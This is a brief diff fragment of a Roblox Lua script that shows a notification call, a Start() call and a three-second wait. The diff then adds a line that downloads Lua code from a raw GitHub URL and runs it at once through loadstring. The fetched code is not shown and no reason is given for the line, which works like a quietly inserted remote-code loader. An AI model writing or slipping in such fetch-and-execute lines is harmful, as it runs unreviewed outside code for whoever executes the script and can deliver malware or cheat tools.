@@ -23,4 +23,5 @@ Gui:SetCore("SendNotification", {
 })
 Start()
 wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GwnJoranwastaken/yasss/main/FallBlock"))()
 end
